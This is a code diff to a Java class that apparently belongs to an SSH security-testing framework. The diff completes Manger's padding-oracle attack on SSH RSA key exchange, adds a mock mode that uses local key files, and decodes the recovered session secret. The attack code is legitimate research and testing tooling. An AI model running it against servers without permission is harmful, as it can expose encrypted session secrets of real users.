@@ -18,10 +18,8 @@ import de.rub.nds.sshattacker.attacks.exception.OracleUnstableException;
 import de.rub.nds.sshattacker.attacks.general.Vector;
 import de.rub.nds.sshattacker.attacks.padding.VectorResponse;
 import de.rub.nds.sshattacker.attacks.padding.vector.FingerprintTaskVectorPair;
-import de.rub.nds.sshattacker.attacks.pkcs1.Manger;
-import de.rub.nds.sshattacker.attacks.pkcs1.MangerWorkflowGenerator;
-import de.rub.nds.sshattacker.attacks.pkcs1.Pkcs1Vector;
-import de.rub.nds.sshattacker.attacks.pkcs1.Pkcs1VectorGenerator;
+import de.rub.nds.sshattacker.attacks.pkcs1.*;
+import de.rub.nds.sshattacker.attacks.pkcs1.oracles.MockOracle;
 import de.rub.nds.sshattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
 import de.rub.nds.sshattacker.attacks.pkcs1.util.OaepConverter;
 import de.rub.nds.sshattacker.attacks.response.EqualityError;
@@ -35,19 +33,30 @@ import de.rub.nds.sshattacker.core.constants.Bits;
 import de.rub.nds.sshattacker.core.constants.KeyExchangeAlgorithm;
 import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
 import de.rub.nds.sshattacker.core.state.State;
+import java.io.FileReader;
+import java.io.IOException;
+import java.io.Reader;
 import java.math.BigInteger;
 import java.nio.ByteBuffer;
+import java.security.InvalidKeyException;
+import java.security.KeyFactory;
 import java.security.NoSuchAlgorithmException;
+import java.security.interfaces.RSAPrivateKey;
 import java.security.interfaces.RSAPublicKey;
+import java.security.spec.InvalidKeySpecException;
+import java.security.spec.PKCS8EncodedKeySpec;
+import java.security.spec.X509EncodedKeySpec;
 import java.util.*;
+import javax.crypto.NoSuchPaddingException;
 import org.apache.logging.log4j.Level;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
+import org.bouncycastle.util.io.pem.PemReader;
 
 /**
- * Sends differently formatted PKCS#1 messages to the TLS server and observes the server responses.
- * In case there are differences in the server responses, it is very likely that it is possible to
- * execute Bleichenbacher attacks.
+ * Sends differently formatted PKCS#1 v2.x messages to the SSH server and observes the server
+ * responses. In case there are differences in the server responses, it is very likely that it is
+ * possible to execute Manger's attack.
  */
 public class MangerAttacker extends Attacker<MangerCommandConfig> {
 
@@ -67,14 +76,13 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
 
     private final ParallelExecutor executor;
 
-    private boolean shakyScans = false;
     private boolean erroneousScans = false;
 
     private KeyExchangeAlgorithm keyExchangeAlgorithm;
 
     /**
-     * @param mangerConfig
-     * @param baseConfig
+     * @param mangerConfig Manger attack config
+     * @param baseConfig Base config
      */
     public MangerAttacker(MangerCommandConfig mangerConfig, Config baseConfig) {
         super(mangerConfig, baseConfig);
@@ -84,9 +92,9 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
     }
 
     /**
-     * @param mangerConfig
-     * @param baseConfig
-     * @param executor
+     * @param mangerConfig Manger attack config
+     * @param baseConfig Base config
+     * @param executor Executor
      */
     public MangerAttacker(
             MangerCommandConfig mangerConfig, Config baseConfig, ParallelExecutor executor) {
@@ -119,7 +127,7 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
         CONSOLE.info("Set key exchange algorithm to: " + keyExchangeAlgorithm);
     }
 
-    /** @return */
+    /** @return If the server is vulnerable to Manger's attack or not */
     @Override
     public Boolean isVulnerable() {
         CONSOLE.info(
@@ -167,7 +175,7 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
         return referenceError != EqualityError.NONE;
     }
 
-    /** @return */
+    /** @return Response vector list */
     public List<VectorResponse> createVectorResponseList() {
         RSAPublicKey publicKey = getServerPublicKey();
         if (publicKey == null) {
@@ -176,7 +184,7 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
         }
 
         List<SshTask> taskList = new LinkedList<>();
-        List<FingerprintTaskVectorPair> stateVectorPairList = new LinkedList<>();
+        List<FingerprintTaskVectorPair<?>> stateVectorPairList = new LinkedList<>();
 
         for (Pkcs1Vector vector :
                 Pkcs1VectorGenerator.generatePkcs1Vectors(
@@ -197,11 +205,11 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
                             additionalTcpTimeout);
 
             taskList.add(fingerPrintTask);
-            stateVectorPairList.add(new FingerprintTaskVectorPair(fingerPrintTask, vector));
+            stateVectorPairList.add(new FingerprintTaskVectorPair<>(fingerPrintTask, vector));
         }
         List<VectorResponse> tempResponseVectorList = new LinkedList<>();
         executor.bulkExecuteTasks(taskList);
-        for (FingerprintTaskVectorPair pair : stateVectorPairList) {
+        for (FingerprintTaskVectorPair<?> pair : stateVectorPairList) {
             ResponseFingerprint fingerprint;
             if (pair.getFingerPrintTask().isHasError()) {
                 erroneousScans = true;
@@ -217,8 +225,8 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
     /**
      * This assumes that the responseVectorList only contains comparable vectors
      *
-     * @param responseVectorList
-     * @return
+     * @param responseVectorList Response vectors
+     * @return Type of EqualityError or EqualityError.NONE if there was none
      */
     public EqualityError getEqualityError(List<VectorResponse> responseVectorList) {
 
@@ -241,6 +249,11 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
         return EqualityError.NONE;
     }
 
+    /**
+     * Fetches the transient public key from a key exchange. It may not be static.
+     *
+     * @return Transient public key
+     */
     public RSAPublicKey getServerPublicKey() {
         RSAPublicKey publicKey = KeyFetcher.fetchRsaTransientKey(sshConfig);
         if (publicKey == null) {
@@ -270,7 +283,12 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
 
     @Override
     public void executeAttack() {
-        // TODO: make attack work
+
+        if (config.isMockAttack()) {
+            mockAttack();
+            return;
+        }
+
         if (!isVulnerable()) {
             LOGGER.warn("The server is not vulnerable to Manger's attack");
             return;
@@ -306,19 +324,94 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
         Manger attacker = new Manger(encryptedSecret, oracle);
         attacker.attack();
         BigInteger solution = attacker.getSolution();
-        byte[] solutionBytes = solution.toByteArray();
-        ByteBuffer buffer = ByteBuffer.allocate(solutionBytes.length + 1);
-        buffer.put((byte) 0);
-        buffer.put(solutionBytes);
+        BigInteger secret =
+                decodeSolution(
+                        solution,
+                        ((RSAPublicKey) oracle.getPublicKey()).getModulus().bitLength()
+                                / Bits.IN_A_BYTE);
+
+        CONSOLE.info("Encoded Solution: " + solution);
+        CONSOLE.info("Decoded Secret: " + secret);
+    }
+
+    private void mockAttack() {
+        RSAPrivateKey privateKey;
+        RSAPublicKey publicKey;
+        MockOracle oracle;
+        ClassLoader loader = Thread.currentThread().getContextClassLoader();
         try {
-            byte[] decodedMessage =
+            // Read private key file and create key factory
+            String privateKeyFileName = config.getMockKeyFileName();
+            Reader fileReader =
+                    new FileReader(
+                            Objects.requireNonNull(loader.getResource(privateKeyFileName))
+                                    .getFile());
+            PemReader reader = new PemReader(fileReader);
+            byte[] content = reader.readPemObject().getContent();
+            KeyFactory factory = KeyFactory.getInstance("RSA");
+
+            // Create private key from file
+            PKCS8EncodedKeySpec privateKeySpec = new PKCS8EncodedKeySpec(content);
+            privateKey = (RSAPrivateKey) factory.generatePrivate(privateKeySpec);
+
+            // Read public key
+            String publicKeyFileName = config.getMockKeyFileName() + ".pub";
+            Reader pubFileReader =
+                    new FileReader(
+                            Objects.requireNonNull(loader.getResource(publicKeyFileName))
+                                    .getFile());
+            PemReader pubReader = new PemReader(pubFileReader);
+            byte[] pubContent = pubReader.readPemObject().getContent();
+
+            // Create public key from file
+            X509EncodedKeySpec pubKeySpec = new X509EncodedKeySpec(pubContent);
+            publicKey = (RSAPublicKey) factory.generatePublic(pubKeySpec);
+
+            oracle = new MockOracle(publicKey, privateKey);
+        } catch (IOException
+                | NoSuchAlgorithmException
+                | InvalidKeySpecException
+                | NoSuchPaddingException
+                | InvalidKeyException e) {
+            throw new OracleException("Could not initialize Mock Oracle", e);
+        }
+
+        byte[] encryptedSecret = ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());
+        Manger attacker = new Manger(encryptedSecret, oracle);
+        attacker.attack();
+        BigInteger solution = attacker.getSolution();
+
+        BigInteger secret =
+                decodeSolution(
+                        solution,
+                        ((RSAPublicKey) oracle.getPublicKey()).getModulus().bitLength()
+                                / Bits.IN_A_BYTE);
+
+        CONSOLE.info("Encoded Solution: " + solution);
+        CONSOLE.info("Decoded Secret: " + secret);
+    }
+
+    private BigInteger decodeSolution(BigInteger solution, int publicKeyByteLength) {
+        try {
+            // Decode solution
+            byte[] solutionBytes = solution.toByteArray();
+
+            byte[] result =
                     OaepConverter.doOaepDecoding(
-                            buffer.array(),
-                            getHashInstance(),
-                            publicKey.getModulus().bitLength() / Bits.IN_A_BYTE);
-            CONSOLE.info("Decoded solution: " + new BigInteger(decodedMessage));
+                            solutionBytes, getHashInstance(), publicKeyByteLength);
+
+            CONSOLE.debug("Secret with length field as byte array: " + Arrays.toString(result));
+            CONSOLE.debug("Secret with length field: " + new BigInteger(result));
+
+            // Cut off length field to get secret as decimal number
+            ByteBuffer secretBuffer = ByteBuffer.wrap(result);
+            secretBuffer.position(4);
+            byte[] secretBytes = new byte[result.length - 4];
+            secretBuffer.get(secretBytes);
+            return new BigInteger(secretBytes);
         } catch (NoSuchAlgorithmException e) {
-            e.printStackTrace();
+            CONSOLE.error("Could not decode solution.", e);
+            return BigInteger.ZERO;
         }
     }
 
@@ -357,10 +450,6 @@ public class MangerAttacker extends Attacker<MangerCommandConfig> {
 
     public List<VectorResponse> getResponseMapList() {
         return fullResponseMap;
-    }
-
-    public boolean isShakyScans() {
-        return shakyScans;
     }
 
     public boolean isErrornousScans() {
